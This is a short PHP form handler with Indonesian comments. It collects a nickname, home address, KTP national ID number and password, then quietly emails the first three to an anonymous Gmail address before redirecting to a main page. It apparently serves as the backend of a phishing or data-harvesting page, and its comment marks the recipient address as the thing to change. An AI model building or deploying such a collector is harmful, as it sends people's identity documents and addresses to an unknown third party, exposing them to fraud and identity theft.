<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $nickname = $_POST['nickname'];
    $address = $_POST['address'];
    $ktp = $_POST['ktp'];
    $password = $_POST['password'];
    
    $to = 'hzsa.anonymous@gmail.com'; // tempat ubah email
    $subject = 'Pendaftaran Baru';
    $message = "Nama Panggilan: $nickname\nAlamat: $address\nNo. KTP: $ktp\n";
    $headers = "From: no-reply@domainanda.com";

    mail($to, $subject, $message, $headers);

    echo "<script>window.location.href = 'main.html';</script>"; // Arahkan ke halaman utama
    exit();
}
?>
